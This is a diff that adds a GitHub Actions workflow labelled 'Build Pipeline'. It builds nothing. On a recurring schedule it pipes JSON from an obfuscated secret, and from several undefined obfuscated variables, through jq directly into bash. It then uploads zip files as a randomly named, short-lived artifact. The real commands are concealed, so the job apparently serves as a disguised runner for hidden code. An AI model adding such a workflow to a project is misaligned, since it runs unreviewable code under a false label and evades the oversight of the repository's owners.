@@ -1,0 +1,35 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '31 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          dixug1532: ${{ secrets.dixug1532 }}
+        run: |
+          printf '%s' "$dixug1532" | jq -r .fs65 | /bin/bash
+          printf '%s' "$ep214" | jq -r .d441 | /bin/bash
+          printf '%s' "$wxmk18" | jq -r .x0410 | /bin/bash
+          printf '%s' "$vnjgd7" | jq -r .hzk4547 | /bin/bash
+          echo $z040 | jq -r .gqbw697 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: JY0BiDfJ
+          path: "*.zip"
+          retention-days: 1
